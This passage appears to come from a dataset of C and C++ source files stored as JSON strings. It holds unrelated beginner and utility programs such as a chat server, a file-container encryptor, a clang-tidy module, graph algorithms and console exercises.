CHECK_FALSE(a <= b);\n    CHECK_FALSE(a == b);\n  }\n\n  SECTION(\"42U vs 42U\") {\n    a.set(42U);\n    b.set(42U);\n\n    CHECK(a == b);\n    CHECK(a <= b);\n    CHECK(a >= b);\n    CHECK_FALSE(a != b);\n    CHECK_FALSE(a < b);\n    CHECK_FALSE(a > b);\n  }\n\n  SECTION(\"42U vs 42\") {\n    a.set(42U);\n    b.set(42);\n\n    CHECK(a == b);\n    CHECK(a <= b);\n    CHECK(a >= b);\n    CHECK_FALSE(a != b);\n    CHECK_FALSE(a < b);\n    CHECK_FALSE(a > b);\n  }\n\n  SECTION(\"[1] vs [1]\") {\n    a.add(1);\n    b.add(1);\n\n    CHECK(a <= b);\n    CHECK(a == b);\n    CHECK(a >= b);\n    CHECK_FALSE(a != b);\n    CHECK_FALSE(a < b);\n    CHECK_FALSE(a > b);\n  }\n\n  SECTION(\"[1] vs [2]\") {\n    a.add(1);\n    b.add(2);\n\n    CHECK(a != b);\n    ",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"book_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"IntegerArray.h\"\n\nIntArray::IntArray(int lenght) : m_lenght(lenght)\n{\n\tif (lenght == 0)\n\t{\n\t\tthrow bad_lenght();\n\t}\n\tm_data = new int[lenght];\n}\n\nIntArray::IntArray(const IntArray& other) : m_lenght(other.m_lenght)\n{\n\tm_data = new int[m_lenght];\n\tfor (int i = 0; i < m_lenght; ++i)\n\t{\n\t\tm_data[i] = other.m_data[i];\n\t}\n}\n\nIntArray::~IntArray()\n{\n\tdelete[] m_data;\n}\n\nint IntArray::getSize() const\n{\n\treturn m_lenght;\n}\n\nint& IntArray::operator[](int index)\n{\n\tif (index >= m_lenght)\n\t{\n\t\tthrow bad_range();\n\t}\n\treturn m_data[index];\n}\n\nconst int& IntArray::operator[](int index) const\n{\n\tif (index >= m_lenght)\n\t{\n\t\tthrow bad_range();\n\t}\n\treturn m_data[index];\n}\n\nIntArray& IntArray::operator = (const IntArray& other)\n{\n\tif (this != &other)\n\t{\n\t\tdelete[] m_data;\n\t\tm_lenght = other.m_lenght;\n\t\tm_data = new int[m_lenght];\n\t\tfor (int i = 0; i < m_lenght; ++i)\n\t\t{\n\t\t\tm_data[i] = other.m_data[i];\n\t\t}\n\t}\n\treturn *this;\n}\n\nvoid IntArray::resize(int newLenght)\n{\n\tif (newLenght == 0)\n\t{\n\t\tthrow bad_lenght();\n\t}\n\tint* newData = new int[newLenght];\n\tint minSize = (newLenght < m_lenght) ? newLenght : m_lenght;\n\tfor (int i = 0; i < minSize; ++i)\n\t{\n\t\tnewData[i] = m_data[i];\n\t}\n\tdelete[] m_data;\n\tm_data = newData;\n\tm_lenght = newLenght;\n}\n\nvoid IntArray::insert(int index, int value)\n{\n\tif (index > m_lenght)\n\t{\n\t\tthrow bad_range();\n\t}\n\tresize(m_lenght + 1);\n\tfor (int i = m_lenght - 1; i > index; --i)\n\t{\n\t\tm_data[i] = m_data[i - 1];\n\t}\n\tm_data[index] = value;\n}\n\nvoid IntArray::erase(int index)\n{\n\tif (index >= m_lenght)\n\t{\n\t\tthrow bad_range();\n\t}\n\tfor (int i = index; i < m_lenght - 1; ++i)\n\t{\n\t\tm_data[i] = m_data[i + 1];\n\t}\n\tresize(m_lenght - 1);\n}",
    "#include <iostream>\r\n#include <WS2tcpip.h>\r\n#include <winsock2.h>\r\n#include <tchar.h>\r\n#include<thread>\r\n#include<vector>\r\n\r\n#pragma comment(lib, \"ws2_32.lib\")\r\n\r\nusing namespace std;\r\n\r\nbool Initialize() {\r\n    WSADATA data;\r\n    return WSAStartup(MAKEWORD(2, 2), &data) == 0;\r\n}\r\n\r\nvoid InteractWithClient(SOCKET clientSocket , vector<SOCKET>& clients) {\r\n\r\n    //send / recv client\r\n\r\n    cout << \"client Connected\" << endl;\r\n    char buffer[4096];\r\n\r\n    while (1) {\r\n\r\n        int bytesrecvd = recv(clientSocket, buffer, sizeof(buffer), 0);\r\n\r\n        if (bytesrecvd <= 0) {\r\n            cout << \"client disconnected\" << endl;\r\n            break;\r\n        }\r\n\r\n        \r\n        string message(buffer, bytesrecvd);\r\n        cout << \"Message from client: \" << message << endl;\r\n\r\n        for (auto client : clients) {\r\n            if (client != clientSocket) {\r\n                send(client, message.c_str(), message.length(), 0);\r\n            }\r\n        }\r\n    }\r\n\r\n    auto it = find(clients.begin(), clients.end(), clientSocket);\r\n\r\n    if (it != clients.end()) {\r\n        clients.erase(it);\r\n    }\r\n\r\n    // Clean up\r\n    closesocket(clientSocket);\r\n}\r\n\r\nint main() {\r\n    if (!Initialize()) {\r\n        cout << \"Winsock initialization failed\" << endl;\r\n        return 1;\r\n    }\r\n\r\n    cout << \"Server program\" << endl;\r\n\r\n    SOCKET listenSocket = socket(AF_INET, SOCK_STREAM, 0);\r\n\r\n    if (listenSocket == INVALID_SOCKET) {\r\n        cout << \"Socket creation failed\" << endl;\r\n        return 1;\r\n    }\r\n\r\n    // Creating address structure\r\n    int port = 12345;\r\n    sockaddr_in serveraddr;\r\n    serveraddr.sin_family = AF_INET;\r\n    serveraddr.sin_port = htons(port);\r\n\r\n    // Convert the IP address (0.0.0.0) and put it inside the sin_addr in binary form\r\n    if (InetPton(AF_INET, _T(\"0.0.0.0\"), &serveraddr.sin_addr) != 1) {\r\n        cout << \"Setting address structure failed\" << endl;\r\n        closesocket(listenSocket);\r\n        WSACleanup();\r\n        return 1;\r\n    }\r\n\r\n    // Bind the socket\r\n    if (bind(listenSocket, reinterpret_cast<sockaddr*>(&serveraddr), sizeof(serveraddr)) == SOCKET_ERROR) {\r\n        cout << \"Bind failed\" << endl;\r\n        closesocket(listenSocket);\r\n        WSACleanup();\r\n        return 1;\r\n    }\r\n\r\n    // Listen\r\n    if (listen(listenSocket, SOMAXCONN) == SOCKET_ERROR) {\r\n        cout << \"Listen failed\" << endl;\r\n        closesocket(listenSocket);\r\n        WSACleanup();\r\n        return 1;\r\n    }\r\n\r\n    cout << \"Server has started listening on port: \" << port << endl;\r\n    \r\n    vector<SOCKET> clients;\r\n\r\n    while (1) {\r\n\r\n        // Accept a client socket\r\n        SOCKET clientSocket = accept(listenSocket, nullptr, nullptr);\r\n\r\n        if (clientSocket == INVALID_SOCKET) {\r\n            cout << \"Invalid client socket\" << endl;\r\n        }\r\n\r\n        clients.push_back(clientSocket);\r\n        thread t1(InteractWithClient, clientSocket , std::ref(clients));\r\n        t1.detach();\r\n     }\r\n    \r\n\r\n    closesocket(listenSocket);\r\n    WSACleanup();\r\n\r\n    return 0;\r\n}\r\n",
    "#include<iostream>\nusing namespace std;\nint Fert_x=20,Fert_y=20,Fert_z=20;\nint pricex,pricey,pricez;\nint Store(){\n\tcout<<\"Welcome to Our Store\"<<endl;\n\tpricex=5850,pricey=6200,pricez=6500;\n\treturn Fert_x+Fert_y+Fert_z;\n}\nvoid Sales(){\n\tstring sale;\n\tint am;\n\tcout<<\"Welcome to Our Fertilizers Shop\"<<endl;\n\tcout<<\"Here are the Brands in the Store\"<<endl;\n\tcout<<\"CAN\\t\"<<\"DAP\\t\"<<\"NPK\\t\"<<endl;\n\tcout<<\"Which Brand would you like to purchase\"<<endl;\n\tcin>>sale;\n\tif(sale==\"CAN\" || sale==\"can\"|| sale==\"Can\")\n\t{\n\t\tcout<<\"The price of CAN is \"<<pricex<<endl;\n\t\tcout<<\"How many sacks do you need\"<<endl;\n\t\tcin>>am;\n\t\tcout<<\"The Total Amount to be paid is \"<<pricex*am<<endl;\n\t}\n\telse if(sale==\"DAP\" || sale==\"dap\"|| sale==\"Dap\")\n\t{\n\t\tcout<<\"The price of DAP is \"<<pricey<<endl;\n\t\t\tcout<<\"How many sacks do you need\"<<endl;\n\t\tcin>>am;\n\t\tcout<<\"The Total Amount to be paid is \"<<pricey*am<<endl;\n\t}\n\telse if(sale==\"NPK \"|| sale==\"npk\"|| sale==\"Npk\")\n\t{\n\t\tcout<<\"The price of  NPK is \"<<pricez<<endl;\n\t\t\tcout<<\"How many sacks do you need\"<<endl;\n\t\tcin>>am;\n\t\tcout<<\"The Total Amount to be paid is \"<<pricez*am<<endl;\n\t}\n}\nint main(){\n\tint Key,StoTotal,SalTotal;\n\tcout<<\"Welcome to GPL LTD\"<<endl;\n\t// This is the Store Keepers phase\n\tfor(int i=0;i<20;i++){\n\t\n\tcout<<\"Press Key 1 to access our Store\"<<endl;\n\t// This is the ShopKeepers Phase\n\tcout<<\"Press Key 2 to access our Sales\"<<endl;\n\tcin>>Key;\n\tif (Key==1)\n\t{\n\t\tStoTotal=Store();\n\t}\n\telse if( Key==2)\n\t{\n\t\tSales();\t\n\t}\n\t}\n}\n",
    "\ufeff#define _SILENCE_EXPERIMENTAL_FILESYSTEM_DEPRECATION_WARNING\r\n\r\n#include <iostream>\r\n#include <fstream>\r\n#include <experimental/filesystem>\r\n#include <string>\r\n#include <cmath>\r\n\r\nusing namespace std;\r\nnamespace fs = std::experimental::filesystem;\r\n\r\nstring root;\r\nunsigned int filelist[65536][2];\r\nshort proc = 0;\r\n\r\nunsigned char key[65536];\r\nunsigned short key_lenght, key_pos, enc_type;\r\n\r\nunsigned int choise(unsigned short max) {\r\n    string choise;\r\n    unsigned char result;\r\n    while (true) {\r\n        result = 0;\r\n        cin >> choise;\r\n        for (int i = 0; i != choise.size(); i++) {\r\n            if (choise[i] > 47 and choise[i] < 58) {\r\n                result = result * 10 + choise[i] - 48;\r\n            }\r\n            else { break; }\r\n        }\r\n        if (result > 0 and result <= max) { return result-1; }\r\n        cout << \"\u0422\u0430\u043a\u043e\u0433\u043e \u0432\u0430\u0440\u0438\u043d\u0442\u0430 \u043d\u0435\u0442! \u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0447\u0438\u0441\u043b\u043e \u043e\u0442 1 \u0434\u043e \" << max << \"!\\n\";\r\n    }\r\n}\r\n\r\nvoid key_transform(string s_key) {\r\n    int i, k=0;\r\n    for (i = s_key.length()-1; i >= 0; i-=2) {\r\n        if (s_key[i] > 47 and s_key[i] < 58) {\r\n            key[k] = s_key[i] - 48;\r\n        }\r\n        else if (s_key[i] > 96 and s_key[i] < 103) {\r\n            key[k] = s_key[i] - 87;\r\n        }\r\n        else if (s_key[i] > 64 and s_key[i] < 71) {\r\n            key[k] = s_key[i] - 55;\r\n        }\r\n        if (i != 0) {\r\n            if (s_key[i-1] > 47 and s_key[i - 1] < 58) {\r\n                key[k] += 16*(s_key[i - 1] - 48);\r\n            }\r\n            else if (s_key[i - 1] > 96 and s_key[i - 1] < 103) {\r\n                key[k] += 16 * (s_key[i - 1] - 87);\r\n            }\r\n            else if (s_key[i - 1] > 64 and s_key[i - 1] < 71) {\r\n                key[k] += 16 * (s_key[i - 1] - 55);\r\n            }\r\n        }\r\n        k++;\r\n    }\r\n    key_lenght = k;\r\n    /*for (i = 0; i != key_lenght; i++) {\r\n        cout << int(key[i]) << \" \";\r\n    }\r\n    cout << \"\u0434\u043b\u0438\u043d\u0430-\" << key_lenght << \"\\n\";*/\r\n}\r\n\r\nunsigned long long encrypt(unsigned long long byte, unsigned char size) {\r\n    int i;\r\n    switch (enc_type) {\r\n    case(0): return byte; break;\r\n    case(1): {\r\n        for (i = 0; i != size; i++) {\r\n            *((char*)&byte + i) += key[key_pos];\r\n            key_pos++;\r\n            if (key_pos == key_lenght) { key_pos = 0; }\r\n        }\r\n        return byte; break;\r\n    }\r\n    default: {\r\n        for (i = 0; i != size; i++) {\r\n            *((char*)&byte + i) ^= key[key_pos];\r\n            key_pos++;\r\n            if (key_pos == key_lenght) { key_pos = 0; }\r\n        }\r\n        return byte;\r\n    }\r\n    }\r\n}\r\n\r\nunsigned long long decrypt(unsigned long long byte, unsigned char size) {\r\n    int i;\r\n    switch (enc_type) {\r\n    case(0): return byte; break;\r\n    case(1): {\r\n        for (i = 0; i != size; i++) {\r\n            *((char*)&byte + i) -= key[key_pos];\r\n            key_pos++;\r\n            if (key_pos == key_lenght) { key_pos = 0; }\r\n        }\r\n        return byte;\r\n    }\r\n    default: {\r\n        for (i = 0; i != size; i++) {\r\n            *((char*)&byte + i) ^= key[key_pos];\r\n            key_pos++;\r\n            if (key_pos == key_lenght) { key_pos = 0; }\r\n        }\r\n        return byte;\r\n    }\r\n    }\r\n}\r\n\r\nstring get_file_name(unsigned short start_file, unsigned int pointer, short start_info_point=0, unsigned int start_i=0) {\r\n    ifstream file(root + \"file\" + char(start_file + 48) + \".vup\", ios::binary | ios::in);\r\n    file.seekg(pointer, ios::beg);\r\n    unsigned short info_point = start_info_point, next_file, place_point=6 - start_info_point;\r\n    unsigned int i, next_place, place_size;\r\n    char symbol;\r\n    string name = \"\";\r\n    file.read((char*)&next_place, 4);\r\n    file.read((char*)&next_file, 2);\r\n    file.seekg(6, ios::cur);\r\n    file.read((char*)&place_size, 4);\r\n    if(info_point!=6 and place_size<7-info_point){\r\n        name = get_file_name(next_file, next_place, place_size + info_point);\r\n        return name;\r\n    }\r\n    file.seekg(pointer + 22 - start_info_point, ios::beg);\r\n    for (i=start_i; i != 256 and place_size>place_point; i++) {\r\n        place_point++;\r\n        file.read((char*)&symbol, 1);\r\n        if (symbol == 0) { break; }\r\n        name += symbol;\r\n    }\r\n    if (place_size <= place_point and i != 256) {\r\n        name += get_file_name(next_file, next_place, 6, i);\r\n    }\r\n    return name;\r\n}\r\n\r\nunsigned long long get_file_weight(unsigned short next_file, unsigned int next_place) {\r\n    unsigned short byte2, info_point = 0;\r\n    unsigned long long byte8, file_size = 0;\r\n    unsigned int byte4, i, place_size = 0;\r\n    unsigned char byte1, type;\r\n    bool first_file = true;\r\n\r\n    while (true) {\r\n        fstream file(root + \"file\" + char(next_file + 48) + \".vup\", ios::binary | ios::out | ios::in);\r\n        file.seekg(next_place, ios::beg);\r\n        file.read((char*)&next_place, 4);\r\n        file.read((char*)&next_file, 2);\r\n        file.seekg(6, ios::cur);\r\n        file.read((char*)&place_size, 4);\r\n        i = 0;\r\n        for (i = i; i < place_size and info_point != 5; i++) {\r\n            if",
    "//===-- AutocryptTidyModule.cpp - clang-tidy ----------------------------===//\n//\n// Part of the LLVM Project, under the Apache License v2.0 with LLVM Exceptions.\n// See https://llvm.org/LICENSE.txt for license information.\n// SPDX-License-Identifier: Apache-2.0 WITH LLVM-exception\n//\n//===----------------------------------------------------------------------===//\n\n#include \"../ClangTidy.h\"\n#include \"../ClangTidyModule.h\"\n#include \"../ClangTidyModuleRegistry.h\"\n#include \"../bugprone/ExceptionEscapeCheck.h\"\n#include \"../bugprone/UseAfterMoveCheck.h\"\n#include \"../bugprone/ReservedIdentifierCheck.h\"\n#include \"../bugprone/SpuriouslyWakeUpFunctionsCheck.h\"\n#include \"../bugprone/DanglingHandleCheck.h\"\n#include \"../bugprone/UnhandledSelfAssignmentCheck.h\"\n#include \"../cppcoreguidelines/ProTypeConstCastCheck.h\"\n#include \"../cppcoreguidelines/ProBoundsPointerArithmeticCheck.h\"\n#include \"../cert/StrToNumCheck.h\"\n#include \"../cert/VariadicFunctionDefCheck.h\"\n#include \"../cert/LimitedRandomnessCheck.h\"\n#include \"../cert/ProperlySeededRandomGeneratorCheck.h\"\n#include \"../cert/DontModifyStdNamespaceCheck.h\"\n#include \"../cert/SetLongJmpCheck.h\"\n#include \"../cert/StaticObjectExceptionCheck.h\"\n#include \"../cert/NonTrivialTypesLibcMemoryCallsCheck.h\"\n#include \"../cert/MutatingCopyCheck.h\"\n#include \"../misc/ThrowByValueCatchByReferenceCheck.h\"\n#include \"../misc/NewDeleteOverloadsCheck.h\"\n#include \"../google/UnnamedNamespaceInHeaderCheck.h\"\n#include \"EmptyCheck.h\"\n\nnamespace clang::tidy {\nnamespace autocrypt {\n\nclass AutocryptModule : public ClangTidyModule {\npublic:\n  void addCheckFactories(ClangTidyCheckFactories &CheckFactories) override {\n    // Cert - C++ checkers\n    // DCL\n    CheckFactories.registerCheck<cert::VariadicFunctionDefCheck>(\"autocrypt-mobis-cert-cpp-dcl50\");\n    CheckFactories.registerCheck<bugprone::ReservedIdentifierCheck>(\"autocrypt-mobis-cert-cpp-dcl51\");\n    CheckFactories.registerCheck<misc::NewDeleteOverloadsCheck>(\"autocrypt-mobis-cert-cpp-dcl54\");\n    CheckFactories.registerCheck<bugprone::ExceptionEscapeCheck>(\"autocrypt-mobis-cert-cpp-dcl57\");\n    CheckFactories.registerCheck<cert::DontModifyStdNamespaceCheck>(\"autocrypt-mobis-cert-cpp-dcl58\");\n    CheckFactories.registerCheck<google::build::UnnamedNamespaceInHeaderCheck>(\"autocrypt-mobis-cert-cpp-dcl59\");\n    // EXP\n    CheckFactories.registerCheck<bugprone::DanglingHandleCheck>(\"autocrypt-mobis-cert-cpp-exp54\");\n    CheckFactories.registerCheck<cppcoreguidelines::ProTypeConstCastCheck>(\"autocrypt-mobis-cert-cpp-exp55\");\n    CheckFactories.registerCheck<bugprone::UseAfterMoveCheck>(\"autocrypt-mobis-cert-cpp-exp63\");\n    // CTR\n    CheckFactories.registerCheck<cppcoreguidelines::ProBoundsPointerArithmeticCheck>(\"autocrypt-mobis-cert-cpp-ctr54\");\n    CheckFactories.registerCheck<cppcoreguidelines::ProBoundsPointerArithmeticCheck>(\"autocrypt-mobis-cert-cpp-ctr55\");\n    CheckFactories.registerCheck<cppcoreguidelines::ProBoundsPointerArithmeticCheck>(\"autocrypt-mobis-cert-cpp-ctr56\");\n    // ERR\n    CheckFactories.registerCheck<cert::SetLongJmpCheck>(\"autocrypt-mobis-cert-cpp-err52\");\n    CheckFactories.registerCheck<cert::StaticObjectExceptionCheck>(\"autocrypt-mobis-cert-cpp-err58\");\n    CheckFactories.registerCheck<misc::ThrowByValueCatchByReferenceCheck>(\"autocrypt-mobis-cert-cpp-err61\");\n    CheckFactories.registerCheck<cert::StrToNumCheck>(\"autocrypt-mobis-cert-cpp-err62\");\n    // OOP\n    CheckFactories.registerCheck<bugprone::UnhandledSelfAssignmentCheck>(\"autocrypt-mobis-cert-cpp-oop54\");\n    CheckFactories.registerCheck<cert::NonTrivialTypesLibcMemoryCallsCheck>(\"autocrypt-mobis-cert-cpp-oop57\");\n    CheckFactories.registerCheck<cert::MutatingCopyCheck>(\"autocrypt-mobis-cert-cpp-oop58\");\n    // CON\n    CheckFactories.registerCheck<bugprone::SpuriouslyWakeUpFunctionsCheck>(\"autocrypt-mobis-cert-cpp-con54\");\n    // MSC\n    CheckFactories.registerCheck<cert::LimitedRandomnessCheck>(\"autocrypt-mobis-cert-cpp-msc50\");\n    CheckFactories.registerCheck<cert::ProperlySeededRandomGeneratorCheck>(\"autocrypt-mobis-cert-cpp-msc51\");\n  }\n\n  ClangTidyOptions getModuleOptions() override {\n    ClangTidyOptions Options;\n    ClangTidyOptions::OptionMap &Opts = Options.CheckOptions;\n    Opts[\"cert-oop54-cpp.WarnOnlyIfThisHasSuspiciousField\"] = \"false\";\n    return Options;\n  }\n};\n\n// Register the AutocryptModule using this statically initialized variable.\nstatic ClangTidyModuleRegistry::Add<AutocryptModule>\n    X(\"autocrypt-module\", \n      \"Adds link checks corresponding to Autocrypt secure coding guidelines.\");\n\n} // namespace autocrypt\n\n// This anchor is used to force the linker to link in the generated object file\n// and thus register the AutocryptModule.\nvolatile int AutocryptModuleAnchorSource = 0;\n\n} // namespace clang::tidy\n",
    "#include <stdio.h>\r\n#include <limits.h>\r\n#include <stdbool.h>\r\n#define V 5\r\nint minKey(int key[], bool mstSet[]) {\r\n    int min = INT_MAX, min_index;\r\n    for (int v = 0; v < V; v++)\r\n        if (mstSet[v] == false && key[v] < min)\r\n            min = key[v], min_index = v;\r\n    return min_index;\r\n}\r\nvoid printMST(int parent[], int graph[V][V]) {\r\n    printf(\"Edge   Weight\\n\");\r\n    for (int i = 1; i < V; i++)\r\n        printf(\"%d - %d    %d \\n\", parent[i], i, graph[i][parent[i]]);\r\n}\r\nvoid primMST(int graph[V][V]) {\r\n    int parent[V];  \r\n    int key[V];        \r\n    bool mstSet[V];    \r\n    for (int i = 0; i < V; i++)\r\n        key[i] = INT_MAX, mstSet[i] = false;\r\n    key[0] = 0;     \r\n    parent[0] = -1; \r\n    for (int count = 0; count < V - 1; count++) {\r\n        int u = minKey(key, mstSet);\r\n        mstSet[u] = true;\r\n        for (int v = 0; v < V; v++) {\r\n            if (graph[u][v] && mstSet[v] == false && graph[u][v] < key[v])\r\n                parent[v] = u, key[v] = graph[u][v];\r\n        }\r\n    }\r\n    printMST(parent, graph);\r\n}\r\nint main() {\r\n    int graph[V][V] = {\r\n        {0, 2, 0, 6, 0},\r\n        {2, 0, 3, 8, 5},\r\n        {0, 3, 0, 0, 7},\r\n        {6, 8, 0, 0, 9},\r\n        {0, 5, 7, 9, 0}\r\n    };\r\n    primMST(graph);\r\n    return 0;\r\n}\r\n",
    "# include \"motorControl.h\"\n\n\nvoid Leftmotor(int dir, uint8_t pwmValue){\n    if(dir == 1){\n        ledcWrite(channel_PWM1, pwmValue);\n        ledcWrite(channel_PWM2, 0);\n    }\n    else if(dir == -1){\n        ledcWrite(channel_PWM1,0);\n        ledcWrite(channel_PWM2,pwmValue);\n    }\n}\nvoid Rightmotor(int dir, uint8_t pwmValue){\n    if(dir == 1){\n        ledcWrite(channel_PWM3, pwmValue);\n        ledcWrite(channel_PWM4, 0);\n    }else if(dir == -1){\n        ledcWrite(channel_PWM3,0);\n        ledcWrite(channel_PWM4,pwmValue);\n    }\n}\nvoid StopMotor(){\n    ledcWrite(channel_PWM1,0);\n    ledcWrite(channel_PWM2,0);\n    ledcWrite(channel_PWM3,0);\n    ledcWrite(channel_PWM4,0);\n}\nvoid motorControl(long leftPWM, long rightPWM, float angle_psi, bool stopstate){\n    if(stopstate){\n        StopMotor();\n    }else{\n        if(abs(angle_psi) > 30){\n            StopMotor();\n        }\n        else{\n            if(leftvolt > 0){\n                Leftmotor(1, abs(leftPWM));\n            }else if(leftvolt < 0){\n                Leftmotor(-1, abs(leftPWM));\n            }else{\n                ledcWrite(channel_PWM1,0);\n                ledcWrite(channel_PWM2,0);\n            }\n\n            if(righvolt > 0){\n                Rightmotor(1, abs(rightPWM));\n            }else if(righvolt < 0){\n                Rightmotor(-1, abs(rightPWM));\n            }else{\n                ledcWrite(channel_PWM3,0);\n                ledcWrite(channel_PWM4,0);\n            }\n        }\n    }\n}",
    "#include <iostream>\n#include <fstream>\n#include <yaml-cpp/yaml.h>\n\nclass quiz {\npublic:\n    std::string question;\n    std::string answer;\n    std::vector<std::string> variants;\n\n    friend void operator>>(const YAML::Node& node, quiz& address) {\n        address.question = node[\"question\"].as<std::string>();\n        address.answer = node[\"answer\"].as<std::string>();\n        address.variants = node[\"variants\"].as<std::vector<std::string>>();\n    }\n};\n\nint main(int argc, char* argv[]) {\n    YAML::Node config;\n\n    if (argc < 2) {\n        std::cout << \"Not many params.\" << std::endl;\n        return 0;\n    }\n\n    try {\n        config = YAML::LoadFile(argv[1]);\n    } catch (const YAML::Exception& e) {\n        // Handle YAML parsing errors\n        std::cerr << \"YAML parsing error: \" << e.what() << std::endl;\n        return 1;\n    }\n\n    int questions_count = config.size();\n\n    const YAML::Node& alldata = config[\"questions\"];\n    std::vector<quiz> questions;\n\n    for (std::size_t i = 0; i < alldata.size(); ++i) {\n        quiz tmp;\n        alldata[i] >> tmp;\n        questions.push_back(tmp);\n    }\n\n    for (quiz i : questions) {\n        std::string question = i.question;\n        std::string ans = i.answer;\n        std::vector<std::string> variants = i.variants;\n\n        std::cout << \"Question:\" << std::endl;\n        std::cout << question << std::endl;\n        std::cout << std::endl;\n\n        std::cout << \"Variants of answer:\" << std::endl;\n        for (int i = 0; i < variants.size(); i++) {\n            std::cout << variants[i] << std::endl;\n        }\n        std::cout << std::endl;\n\n        std::string answer;\n        std::cout << \"Enter your answer: \";\n        std::cin >> answer;\n\n        if (answer == ans){\n            std::cout << \"You are right.\" << std::endl;\n        }\n\n        std::cout << std::endl;\n    }\n\n    return 0;\n}",
    "// Single linked list fixx.cpp : This file contains the 'main' function. Program execution begins and ends there.\n//\n\n#include <iostream>\nusing namespace std;\n\nstruct Node {\n\tint noMhs;\n\tstring name;\n\tNode* next;\n};\n\nNode* START = NULL;\n\nvoid addNode() {\n\tint nim;\n\tstring nama;\n\tNode* nodeBaru = new Node();\n\tcout << \"Masukkan NIM: \";\n\tcin >> nim;\n\tcout << \"Masukkan Nama: \";\n\tcin >> nama;\n\tnodeBaru->noMhs = nim;\n\tnodeBaru->name = nama;\n\n\tif (START == NULL || nim <= START->noMhs) {\n\t\tif (START != NULL && nim == START->noMhs)\n\t\t{\n\t\t\tcout << \"NIM sudah ada\" << endl;\n\t\t\treturn;\n\t\t}\n\n\t\tnodeBaru->next = START;\n\t\tSTART = nodeBaru;\n\t\treturn;\n\t}\n\n\tNode* previous = START;\n\tNode* current = START;\n\n\twhile ((current != NULL) && (nim >= current->noMhs))\n\t{\n\t\tif (nim == current->noMhs)\n\t\t{\n\t\t\tcout << \"NIM sudah ada\" << endl;\n\t\t\treturn;\n\t\t}\n\t\tprevious = current;\n\t\tcurrent = current->next;\n\t}\n\n\tnodeBaru->next = current;\n\tprevious->next = nodeBaru;\n}\n\nbool serachNode(int nim, Node* current, Node* previous) {\n\tprevious = START;\n\tcurrent = START;\n\twhile (current != NULL && nim > current->noMhs)\n\t{\n\t\tprevious = current;\n\t\tcurrent = current->next;\n\t}\n\tif (current == NULL)\n\t{\n\t\treturn false;\n\t}\n\telse if (current->noMhs == nim)\n\t{\n\t\treturn true;\n\t}\n\telse\n\t{\n\t\treturn false;\n\t}\n}\nbool deleteNode(int nim) {\n\tNode* current = START;\n\tNode* previous = START;\n\tif (serachNode(nim, previous, current) == false)\n\t\treturn false;\n\tprevious->next = current->next;\n\tif (current == START)\n\t\tSTART = current->next;\n\treturn true;\n}\nbool listEmpty() {\n\tif (START == NULL)\n\t\treturn true;\n\telse\n\t\treturn false;\n\n}\nvoid traverse() {\n\tif (listEmpty()) {\n\t\tcout << \"List Kosong\" << endl;\n\t\tsystem(\"pause\");\n\t\tsystem(\"cls\");\n\t\treturn;\n\t}\n\telse {\n\t\tNode* currentNode = START;\n\t\twhile (currentNode != NULL) {\n\t\t\tcout << \"NIM: \" << currentNode->noMhs << \", Nama: \" << currentNode->name << endl;\n\t\t\tcurrentNode = currentNode->next;\n\t\t}\n\t}\n}\n\nvoid searchData() {\n\tif (listEmpty()) {\n\t\tcout << \"List Kosong\" << endl;\n\t\tsystem(\"pause\");\n\t\tsystem(\"cls\");\n\t\treturn;\n\t}\n\telse {\n\t\tint nim;\n\t\tcout << \"Masukkan NIM: \";\n\t\tcin >> nim;\n\t\tNode* currentNode = START;\n\t\twhile (currentNode != NULL) {\n\t\t\tif (currentNode->noMhs == nim) {\n\t\t\t\tcout << \"NIM: \" << currentNode->noMhs << \",Nama: \" << currentNode->name << endl;\n\t\t\t\treturn;\n\t\t\t}\n\t\t\tcurrentNode = currentNode->next;\n\t\t}\n\t\tcout << \"Data tidak ditemukan\" << endl;\n\t}\n}\n\n\nint main()\n{\n\tint pilihan;\n\tdo\n\t{\n\t\ttry\n\t\t{\n\n\t\t\tcout << \"1. Tambah Data\" << endl;\n\t\t\tcout << \"2. Hapus Data\" << endl;\n\t\t\tcout << \"3. Tampilkan Data\" << endl;\n\t\t\tcout << \"4. Cari Data\" << endl;\n\t\t\tcout << \"5. Keluar\" << endl;\n\t\t\tcout << \"Pilihan: \";\n\t\t\tcin >> pilihan;\n\t\t\tswitch (pilihan)\n\t\t\t{\n\t\t\tcase 1:\n\t\t\t\taddNode();\n\t\t\t\tcout << \"Data Berhasil Ditambahkan\" << endl;\n\t\t\t\tsystem(\"pause\");\n\t\t\t\tsystem(\"cls\");\n\t\t\t\tbreak;\n\t\t\tcase 2:\n\t\t\t\tif (listEmpty())\n\t\t\t\t{\n\t\t\t\t\tcout << \"List Kosong\" << endl;\n\t\t\t\t\tsystem(\"pause\");\n\t\t\t\t\tsystem(\"cls\");\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\n\t\t\t\tint nim;\n\t\t\t\tcout << \"Masukkan NIM: \";\n\t\t\t\tcin >> nim;\n\t\t\t\tif (deleteNode(nim)) {\n\t\t\t\t\tcout << \"nim: \" << nim << \" berhasil dihapus\" << endl;\n\t\t\t\t\tsystem(\"pause\");\n\t\t\t\t\tsystem(\"cls\");\n\t\t\t\t}\n\t\t\t\telse\n\t\t\t\t\tcout << \"Data tidak ditemukan\" << endl;\n\t\t\t\tbreak;\n\t\t\tcase 